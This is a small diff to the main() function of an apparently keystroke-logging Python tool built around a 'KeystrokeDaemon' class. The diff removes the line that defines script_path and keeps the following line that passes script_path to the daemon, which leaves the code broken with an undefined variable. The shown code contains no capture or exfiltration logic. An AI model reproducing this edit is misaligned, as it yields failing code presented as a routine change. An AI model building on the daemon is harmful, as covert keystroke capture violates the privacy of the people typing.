@@ -39,7 +39,6 @@ def main():
             print("[+] Profile collection ended.")
             return
 
-    script_path = os.path.abspath(__file__)
     daemon = KeystrokeDaemon(main_script_path=script_path)
     daemon.run()
 
